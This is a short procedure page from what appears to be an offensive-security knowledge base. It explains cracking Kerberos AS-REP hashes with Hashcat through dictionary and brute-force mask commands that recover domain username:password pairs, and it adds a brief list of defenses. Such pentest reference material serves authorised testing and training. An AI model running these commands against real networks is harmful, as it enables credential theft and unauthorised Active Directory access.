---
type: procedure
description: >-
  Use Hashcat to perform dictionary or brute-force attacks on AS-REP hashes to
  recover plaintext passwords.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Brute Force]]'
sub_techniques:
  - '[[Password Guessing]]'
  - '[[Password Cracking]]'
tags:
  - cryptography
  - password-cracking
  - kerberos
platforms:
  - Linux
  - Windows
commands:
  - '[[commands/Hashcat-Dictionary-Attack-on-Hashes]]'
tools:
  - '[[tools/Hashcat]]'
validated: true
---

# Brute-Force-AS-REP-Hashes-with-Hashcat

## Summary

This procedure cracks AS-REP etype 23 hashes using Hashcat's dictionary mode, leveraging wordlists to recover passwords from roastable Kerberos tickets obtained via GetNPUsers.

## Description

AS-REP hashes are vulnerable to offline cracking due to RC4 encryption and pre-auth bypass. Dictionary attacks with common passwords succeed against weak policies, providing creds for WinRM or further AD access.

## Requirements

1. AS-REP hash file in Hashcat format
2. Wordlist (e.g., rockyou.txt, 14M entries)
3. Hashcat with GPU acceleration
4. Identified mode (18200 for etype 23)

## Defense

- Enforce minimum password length >12 and complexity
- Monitor GPU usage for cracking activity
- Use AS-REQ auditing to detect roasting attempts
- Implement Kerberos Armoring (FAST) for pre-auth

## Objectives

1. Recover plaintext from AS-REP hashes
2. Obtain valid domain credentials
3. Enable authenticated access to AD resources

## Instructions

### Step 1: Prepare Environment

**Context**: Ensure Hashcat is updated; select optimal wordlist.

**Command**:
```bash
hashcat --version
```

> Confirms installation. Download rockyou if needed.

### Step 2: Launch Dictionary Attack

**Context**: Use -m 18200; -O for optimized kernel.

**Command** ([[commands/Hashcat-Dictionary-Attack-on-Hashes]]):
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3
```

> Runs on GPU. Expected: Progress updates, cracked hashes shown.

### Step 3: Check Cracked Results

**Context**: Use --show to list recovered passwords.

**Command**:
```bash
hashcat -m 18200 asrep_hashes.txt --show
```

> Outputs username:password pairs.

### Step 4: If Unsuccessful, Escalate Attack

**Context**: Switch to rules or mask if dict fails.

**Command**:
```bash
hashcat -m 18200 asrep_hashes.txt -a 3 ?u?l?l?l?d?d?d?d
```

> Brute-force mask. Success: Passwords cracked for use in WinRM.
